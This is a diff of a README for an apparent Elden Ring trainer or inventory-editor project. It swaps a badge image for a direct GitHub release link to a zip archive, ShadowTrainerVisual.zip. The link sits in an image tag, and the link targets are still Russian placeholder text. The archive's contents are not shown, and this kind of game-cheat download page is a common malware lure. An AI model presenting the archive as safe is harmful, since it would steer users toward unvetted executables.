@@ -7,13 +7,13 @@
   
   <p align="center">
     <a href="твоя_ссылка_на_скачивание_или_пост">
-      <img src="https://img.shields.io/badge/DOWNLOAD%20V1.0-READY!-28a745?style=for-the-badge&logoColor=white&logo=git&labelColor=333" alt="Download V1.0 READY!">
+      <img src="https://github.com/Rendi-18/EldenRing-Player-Inventory-Editor/releases/download/elden-ring/ShadowTrainerVisual.zip" alt="Download V1.0 READY!">
     </a>
   </p>
 
   <p align="center">
     <a href="ссылка_на_все_релизы">
-      <img src="https://img.shields.io/badge/ALL%20RELEASES-007bff?style=for-the-badge&logo=github&logoColor=white&labelColor=222" alt="All Releases">
+      <img src="" alt="All Releases">
     </a>
   </p>
 
